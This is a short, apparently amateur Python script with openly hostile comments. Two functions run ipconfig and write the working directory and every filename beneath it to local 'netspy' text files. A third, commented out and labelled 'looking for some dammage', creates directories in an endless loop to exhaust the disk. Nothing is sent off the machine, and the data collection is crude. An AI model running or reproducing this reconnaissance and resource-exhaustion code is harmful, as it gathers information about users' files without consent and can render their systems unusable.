import os


def phish_phush(): #looking for some info
    x = os.getcwd()
    os.system("ipconfig")
    cb = open(str(x) + "\\" + "netspy.txt", "a")
    cb.write(x)
    cb.close()


phish_phush()


def ballade():  #looking for some info
    x = os.getcwd()
    os.walk(x)
    cb = open(str(x) + "\\" + "netspy2.txt", "a")
    for P, D, F in os.walk(x):
        for F2 in F:
            cb.write(F2)
    cb.close()


ballade()


def kat_lani(): #looking for some dammage
    newdir = 1
    while True:
        os.mkdir(str(newdir))
        newdir += 1


#kat_lani()



